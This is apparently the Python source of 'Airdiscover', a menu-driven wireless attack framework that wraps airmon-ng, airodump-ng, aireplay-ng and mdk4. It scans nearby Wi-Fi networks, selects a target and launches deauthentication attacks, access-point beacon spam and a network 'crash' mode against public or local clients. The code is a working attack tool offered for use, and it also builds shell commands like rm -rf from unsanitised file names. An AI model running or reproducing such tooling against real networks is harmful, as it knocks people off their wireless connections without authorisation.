import os
import colorama
import subprocess
import random
import sys
import scapy
import csv
import time
import shutil
from datetime import datetime
import time
from colorama import Fore, Back, Style
import re
colorama.init()
main = "/usr/share/airdiscover"
log = "/usr/share/airdiscover/conf/airdiscover.log"
pixie_php = "/usr/share/airdiscover/pixie.php"
version_log = "/usr/share/airdiscover/VERSION"
update_check = True
active_wireless_networks = []
INTERFACE="" #you can specify it manually too
MONITOR="DISABLED"
MONITORED_INTERFACE="None"
NETWORK_SELECTED=False
BSSID="None"
ESSID="None"
CHANNEL="None"
CRYPTO="None"
rootless = "None"
current_dir_list = os.listdir()
if len(sys.argv) < 2:
    pass
else:
    rootless = sys.argv[1]

try:
    if os.path.exists("/usr/share/airdiscover/cache"):
        pass
    else:
        os.mkdir("/usr/share/airdiscover/cache")
except Exception as mkdir_except:
    print(Fore.RED+'[-]'+Fore.RESET+' Error: '+mkdir_except)
    sys.exit()
if not 'SUDO_UID' in os.environ.keys():
    if rootless == "--no-root":
        print(Fore.RED+'[-]'+Fore.RESET+' Your Using Airdiscover Without Root, You Can Receive Problems.')
    else:
        print(Fore.RED+'[-]'+Fore.RESET+' Run As Root.')
        print(Fore.RED+'[-]'+Fore.RESET+' To Continue Without Root Type "--no-root"')
        exit()

for file_name in os.listdir():
    if ".csv" in file_name:
        print(Fore.RED+"[-]"+Fore.RESET+" There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory.")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print(Fore.YELLOW+"[+]"+Fore.RESET+" Backup folder exists.")
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)


time.sleep(1)
if INTERFACE == "":
    wlan_pattern = re.compile("^wlan[0-9]+")
    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
    if len(check_wifi_result) == 0:
        print(Fore.RED+"[-]"+Fore.RESET+" No WiFi (WLAN) Adapters found.")
        print(Fore.CYAN+'[?]'+Fore.RESET+' Do You Want to Set The Interface Manually (Y/n)?')
        manual = str(input("> "))
        if manual == 'y' or manual == 'Y' or manual == 'yes':
            print(Fore.CYAN+'[-]'+Fore.RESET+' Please Enter The Interface Name.')
            interface_name = input("> ")
            INTERFACE=interface_name
            print(Fore.YELLOW+'[+]'+Fore.RESET+f' Set The Interface: {Fore.GREEN}{INTERFACE}{Fore.RESET}')
            time.sleep(0.8)
        else:
            sys.exit()
    else:
        print(Fore.YELLOW+"[+]"+Fore.RESET+" The Following WiFi Interfaces Are Available:\n")
        print(Fore.LIGHTGREEN_EX+'-----------------------------'+Fore.RESET)
        for index, item in enumerate(check_wifi_result):
            print(f"{index} - {item}")
        print(Fore.LIGHTGREEN_EX+'-----------------------------\n'+Fore.RESET)
        while True:
            print(Fore.YELLOW+"[+]"+Fore.RESET+" Please Select The Interface: ")
            wifi_interface_choice = int(input("> ").strip(" "))
            try:
                if check_wifi_result[int(wifi_interface_choice)]:
                    break
            except:
                print(Fore.RED+"[-]"+Fore.RESET+" Please Enter a Valid Number From List.")
        INTERFACE = check_wifi_result[int(wifi_interface_choice)]
        print(Fore.YELLOW+'[+]'+Fore.RESET+f' Set The Interface: {Fore.GREEN}{INTERFACE}{Fore.RESET}')
        time.sleep(0.8)
else:
    print(Fore.YELLOW+'[+]'+Fore.RESET+f' Set The Interface: {Fore.GREEN}{INTERFACE}{Fore.RESET}')
    time.sleep(0.8)

def check_for_essid(essid, lst):
    check_status = True
    if len(lst) == 0:
        return check_status
    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status

def read_version():
    try:
        with open(version_log, "r") as version:
            ver = version.read()
    except Exception as version_output:
        print(Fore.RED+'[-]'+Fore.RESET+f' Error: {version_output}')
        sys.exit()
    return ver

def write_to_log(error):
    if error == 'remove_log':
        os.system(f'rm -rf {log}')
        os.system(f'touch {log}')
    elif error == 'clean_csv':
        for csv in os.listdir():
            if ".csv" in csv:
                try:
                    with open(log, "a") as log_output_2:
                        log_output_2.write("file moved: "+error)
                except Exception as log_write:
                    print(Fore.RED+'[-]'+Fore.RESET+f' Error: {log_write}')
                    sys.exit()
                os.system('mv '+csv+' /usr/share/airdiscover/cache')
            else:
                pass
    elif error == "cache_clean":
        try:
            for files in os.listdir("/usr/share/airdiscover/cache"):
                if ".csv" in files or ".log" in files:
                    os.system('rm -rf /usr/share/airdiscover/cache/'+files)
                else:
                    pass
        except Exception as cleanup_error:
            print(Fore.RED+'[-]'+Fore.RESET+' Error: '+cleanup_error)
            sys.exit()
    try:
        with open(log, "a") as log_output:
            log_output.write("command: "+error)
    except Exception as log_write:
        print(Fore.RED+'[-]'+Fore.RESET+f' Error: {log_write}')
        sys.exit()

def banners():
    banners = [f'''
  ___  _         _ _                             
 / _ \(_)       | (_)                            
/ /_\ \_ _ __ __| |_ ___  ___ _____   _____ _ __ 
|  _  | | '__/ _` | / __|/ __/ _ \ \ / / _ \ '__| {read_version()}
| | | | | | | (_| | \__ \ (_| (_) \ V /  __/ |   
\_| |_/_|_|  \__,_|_|___/\___\___/ \_/ \___|_| By G00Dway.
'''+Style.BRIGHT+'''
+ -- =--{ '''+Fore.YELLOW+'''Airdiscover Framework'''+Fore.RESET+'''    }
     =--{ HackNET Azerbaijan Org.  }
'''+Style.RESET_ALL]
    select = random.choice(banners)
    print(select)


def load_ddos(bss, chh, monitor_num):
    def load_dos():
        print(Fore.BLUE+'[*]'+Fore.RESET+' Starting Deauth Attack, Press CTRL + C To Stop...')
        time.sleep(1)
        subprocess.run(["xterm", "-T", "Monitor Mode (Airdiscover)", "-e", "airmon-ng", "start", monitor_num, chh])
        subprocess.run(["xterm", "-T", "Deauth Attack (Airdiscover)", "-e", "aireplay-ng", "--deauth", "0", "-a", bss, monitor_num])
    load_dos()
def ddos_attacks(monitor):
    def load_dos_attack():
        load_ddos(BSSID, CHANNEL, monitor)
    if ESSID == "None" or BSSID == "None" or MONITORED_INTERFACE == "None":
        print(Fore.RED+'[-]'+Fore.RESET+' Please Select a Network!')
    else:
        pass
    if INTERFACE == "":
        print(Fore.RED+'[-]'+Fore.RESET+' Please Select a Interface!')
    else:
        load_dos_attack()


# menu_scan_no_interface = Fore.LIGHTBLUE_EX+f'''
# Scan, Interface Options
# ----------------------------------{Fore.RESET}
# 1) Put Interface to monitor mode
# 2) Put interface to managed mode
# 3) Select another interface
# 4) Scan for available networks (NEEDS MONITOR MODE!)
# '''
def monitor_configure():
    global MONITOR
    if MONITOR == "DISABLED":
        MONITOR = Fore.RED+"DISABLED"+Fore.RESET
    else:
        MONITOR = Fore.LIGHTGREEN_EX+"ENABLED"+Fore.RESET

monitor_configure()
def config():
    optional_menu = Fore.CYAN+f'''
-------------------
Interface: {Fore.GREEN}{INTERFACE}{Fore.CYAN}
Target BSSID: {BSSID}
Target ESSID: {ESSID}
On Channel: {CHANNEL}
Target Encryption: WPA, WPA2, WEP{Fore.LIGHTBLUE_EX}
-------------------{Fore.RESET}

---------
0) Settings / Update menu / Exit
---------{Fore.LIGHTBLUE_EX}

Scan, Interface Options
----------------------------------{Fore.RESET}
1) Put Interface to monitor mode
2) Put interface to managed mode
3) Clean up database files
4) Scan for available networks, select network (NEEDS MONITOR MODE!)
{Fore.LIGHTBLUE_EX}
Optional features, attacks ({Fore.RED}MONITOR MODE{Fore.LIGHTBLUE_EX})
----------------------------------{Fore.RESET}
5) Aireplay Deauth Attack ({Fore.LIGHTGREEN_EX}Aireplay-ng{Fore.RESET})
6) MDK / MDK3 / MDK4 Deauth Attacks
'''
    return optional_menu

def config_mdk():
    mdk_menu = Fore.CYAN+f'''
-------------------
Interface: {Fore.GREEN}{INTERFACE}{Fore.CYAN}
Target BSSID: {BSSID}
Target ESSID: {ESSID}
On Channel: {CHANNEL}
Target Encryption: WPA, WPA2, WEP{Fore.LIGHTBLUE_EX}
-------------------{Fore.RESET}

---------
0) Go Back
---------{Fore.LIGHTBLUE_EX}

MDK Attacks, features {Fore.RESET}({Fore.LIGHTGREEN_EX}Public/Local{Fore.RESET}){Fore.LIGHTBLUE_EX}
------------------------------------{Fore.RESET}
1) Spam AP(s) / MDK4
2) Deauth Public/Target Network Client(s) / MDK4
3) Deauth Local Network Client(s) / MDK4 ({Fore.LIGHTGREEN_EX}Local/Doesnt Require Target{Fore.RESET})
4) Crash Local/Public/Target Network(s) / MDK4 / MDK
'''
    return mdk_menu

def settings_config():
    settings_menu = Fore.CYAN+f'''
-------------------
Interface: {Fore.GREEN}{INTERFACE}{Fore.CYAN}
Target BSSID: {BSSID}
Target ESSID: {ESSID}
On Channel: {CHANNEL}
Target Encryption: WPA, WPA2, WEP{Fore.LIGHTBLUE_EX}
-------------------{Fore.LIGHTBLUE_EX}

Settings, Update menu
----------------------------------{Fore.RESET}
1) Update / Check for updates
2) Go back
3) Exit
'''
    return settings_menu


def mdk4_attacks(type):
    if MONITORED_INTERFACE == "None":
        print(Fore.RED+'[-]'+Fore.RESET+' You Have No Monitored Interface Selected, Please Perform a Network Scan First!')
        time.sleep(1)
    else:
        pass
    if type == "spam":
        print(Fore.BLUE+'[*]'+Fore.RESET+' AP Spam Started, Press CTRL + C To Stop...')
        subprocess.run(["xterm", "-T", "AP(s) Spam (Airdiscover)", "-e", "mdk4", MONITORED_INTERFACE, "b"])
    elif type == "client_deauth":
        print(Fore.BLUE+'[*]'+Fore.RESET+' Client(s) (Public) Deauth Started, Press CTRL + C To Stop...')
        subprocess.run(["xterm", "-T", "Deauth Public Client(s) (Airdiscover)", "-e", "mdk4", MONITORED_INTERFACE, "a"])
    elif type == "client_deauth_local":
        print(Fore.BLUE+'[*]'+Fore.RESET+' Client(s) (Local) Deauth Started, Press CTRL + C To Stop...')
        subprocess.run(["xterm", "-T", "Deauth Local Client(s) (Airdiscover)", "-e", "mdk4", MONITORED_INTERFACE, "d"])
    elif type == "crash":
        print(Fore.BLUE+'[*]'+Fore.RESET+' Crash/Deauth (Public/Local) Started , Press CTRL + C To Stop...')
        subprocess.run(["xterm", "-T", "Crash/Deauth Local/Public (Airdiscover)", "-e", "mdk4", MONITORED_INTERFACE, "w"])


def mdk_attacks_menu():
    os.system("clear")
    banners()
    def clear_print():
        os.system('clear')
        banners()
        print(config_mdk())
    def bssid_essid_check():
        if BSSID == "None" or ESSID == "None" or CHANNEL == "None":
            return False
        else:
            return True
    print(config_mdk())
    while True:
        try:
            selection_attack = int(input("> "))
        except Exception as menu_error:
            print(Fore.RED+'[-]'+Fore.RESET+f' Error: {menu_error}')
            sys.exit()
        if selection_attack == '':
            print(Fore.RED+'[-]'+Fore.RESET+' Select a Valid Option!')
            time.sleep(0.5)
            clear_print()
        elif selection_attack == 0:
            break
        elif selection_attack == 1:
            if bssid_essid_check() == False:
                print(Fore.RED+'[-]'+Fore.RESET+' No Network Selected!')
                time.sleep(1)
                break
            else:
                mdk4_attacks("spam")
                clear_print()
        elif selection_attack == 2:
            if bssid_essid_check() == False:
                print(Fore.RED+'[-]'+Fore.RESET+' No Network Selected!')
                time.sleep(1)
                break
            else:
                mdk4_attacks("client_deauth")
                clear_print()
        elif selection_attack == 3:
            mdk4_attacks("client_deauth_local")
        elif selection_attack == 4:
            if bssid_essid_check() == False:
                print(Fore.RED+'[-]'+Fore.RESET+' No Network Selected!')
                time.sleep(1)
                break
            else:
                mdk4_attacks("crash")
                clear_print()
        else:
            print(Fore.RED+'[-]'+Fore.RESET+' Select a Valid Option!')
            time.sleep(0.5)
            clear_print()


os.system("clear")
banners()
def clear_print():
    os.system('clear')
    banners()
    print(config())
print(config())
while True:
    try:
        selection_attack = int(input("> "))
    except Exception as menu_error:
        print(Fore.RED+'[-]'+Fore.RESET+' Interrupt...')
        sys.exit()
    if selection_attack == '':
        print(Fore.RED+'[-]'+Fore.RESET+' Select a Valid Option!')
        time.sleep(0.5)
        clear_print()
    elif selection_attack == 0:
        os.system('clear')
        banners()
        print(settings_config())
        try:
            settings = int(input("> "))
        except Exception as settings_error:
            print(Fore.RED+'[-]'+Fore.RESET+" Interrupt...")
            clear_print()
        if settings == 1:
            os.system('python3 /usr/share/airdiscover/src/modules/update.py')
        elif settings == 2:
            pass
        elif settings == 3:
            top = '.'
            bar = ['/', '-', '\\', '|']
            print(Fore.BLUE+'[*]'+Fore.RESET+' Checking For Cleanup...')
            time.sleep(0.5)
            if ".csv" in os.listdir():
                for i in bar:
                    top+='.'
                    if "....." in top or "......" in top:
                        top+=Fore.GREEN+'ok'+Fore.RESET
                    time.sleep(0.4)
                    sys.stdout.write(Fore.BLUE+f"\r[{Fore.RESET}{i}{Fore.BLUE}]"+Fore.RESET+" Cleaning up temporary files{top}")
                write_to_log("remove_log")
                write_to_log("clean_csv")
                print('')
                sys.exit()
            else:
                print(Fore.YELLOW+"[+]"+Fore.RESET+' No Cleanup')
                sys.exit()
        else:
            print(Fore.RED+'[-]'+Fore.RESET+' Select a Valid Option!')
            clear_print()
        clear_print()
    elif selection_attack == 1:
        print(Fore.LIGHTBLUE_EX+'Killing Processes...'+Fore.RESET)
        kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])
        print(Fore.LIGHTGREEN_EX+"Putting WiFi Adapter Into Monitored Mode..."+Fore.RESET)
        put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", INTERFACE])
        MONITOR="ENABLED"
        monitor_configure()
        clear_print()
    elif selection_attack == 2:
        print(Fore.LIGHTBLUE_EX+'Putting Interface Into Managed Mode...'+Fore.RESET)
        put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "stop", INTERFACE])
        restart_service = subprocess.run(["sudo", "service", "NetworkManager", "restart"])
        MONITOR="DISABLED"
        monitor_configure()
        clear_print()
    elif selection_attack == 3:
        write_to_log("cache_clean")
        time.sleep(0.9)
        clear_print()
    elif selection_attack == 4:
        for a in os.listdir():
            if '.csv' in a:
                os.system('rm -rf '+a)
            else:
                pass
        if MONITORED_INTERFACE == "None":
            print(Fore.CYAN+'[?]'+Fore.RESET+' Please Enter The Monitored Name Of The Interface You Selected:')
            wifi_mon = input("> ")
        else:
            print(Fore.YELLOW+'[+]'+Fore.RESET+f' Using Monitored Interface: {Fore.LIGHTGREEN_EX}{MONITORED_INTERFACE}{Fore.RESET}')
            time.sleep(0.7)
        MONITORED_INTERFACE=wifi_mon
        print(Fore.BLUE+"\nPlease, Wait...")
        discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", wifi_mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            while True:
                subprocess.call("clear", shell=True)
                for file_name in os.listdir():
                        fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                        if ".csv" in file_name:
                            with open(file_name) as csv_h:
                                csv_h.seek(0)
                                csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                                for row in csv_reader:
                                    if row["BSSID"] == "BSSID":
                                        pass
                                    elif row["BSSID"] == "Station MAC":
                                        break
                                    elif check_for_essid(row["ESSID"], active_wireless_networks):
                                        active_wireless_networks.append(row)

                print(Fore.BLUE+"[*]"+Fore.RESET+" Scanning... Press Ctrl+C when you want to select\n")
                print(Fore.RESET+"No |\tBSSID              |\tChannel|\tESSID                         |")
                print(Fore.RESET+"___|\t___________________|\t_______|\t______________________________|")
                for index, item in enumerate(active_wireless_networks):
                    print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
                time.sleep(0.5)

        except KeyboardInterrupt:
            print(Fore.RED+"[-]"+Fore.RESET+" Scan Stopped...")
        while True:
            print(Fore.CYAN+"[?]"+Fore.RESET+" Please select your choice: ")
            choice = input("> ")
            try:
                if active_wireless_networks[int(choice)]:
                    break
            except:
                print(Fore.RED+"[-]"+Fore.RESET+" Please try again.")
        hackbssid = active_wireless_networks[int(choice)]["BSSID"]
        hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
        hackessid = active_wireless_networks[int(choice)]["ESSID"]
        with open("/usr/share/airdiscover/temp/settings/target-bssid.txt", 'w') as target_bssid:
            target_bssid.write(hackbssid)
        with open("/usr/share/airdiscover/temp/settings/target-channel.txt", 'w') as target_channel:
            target_channel.write(hackchannel)
        BSSID = hackbssid
        CHANNEL = hackchannel
        ESSID = hackessid
        clear_print()
    elif selection_attack == 5:
        ddos_attacks(MONITORED_INTERFACE)
        clear_print()
    elif selection_attack == 6:
        mdk_attacks_menu()
        clear_print()
    else:
        print(Fore.RED+'[-]'+Fore.RESET+' Select a Valid Option!')
        time.sleep(0.5)
        clear_print()
